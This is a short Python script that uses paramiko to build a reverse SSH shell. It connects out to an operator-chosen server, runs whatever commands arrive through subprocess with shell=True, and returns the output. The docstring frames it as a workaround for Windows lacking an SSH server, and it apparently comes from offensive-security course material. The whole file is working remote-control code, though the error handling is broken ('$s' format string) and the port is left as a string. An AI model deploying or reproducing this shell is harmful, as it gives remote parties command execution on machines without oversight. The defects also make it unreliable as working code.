import paramiko
import shlex
import subprocess

'''
Most Windows clients don't include an SSH Server out of the box.
Reverse the process: Sending commands from a SSH server to the SSH client. 
'''

def ssh_command(ip, port, user, passwd, cmd):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(ip, port=port, username=user, password=passwd)

    ''' get socket (transport object) -> request channel (of type session) '''
    ssh_session = ssh_client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(cmd)
        print(ssh_session.recv(1024).decode())
        while True:
            cmd_bytes = ssh_session.recv(1024)
            try:
                command = cmd_bytes.decode()
                if command == 'exit':
                    ssh_client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(command), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(b'$s' % e)
        ssh_client.close()
    return


if __name__ == '__main__':
    import getpass
    username = input("Username: ")
    # username = getpass.getuser()
    password = getpass.getpass()
    ip_addr = input('Enter server IP: ')
    port_number = input('Enter port: ')

    ssh_command(ip_addr, port_number, username, password, 'Client connected')
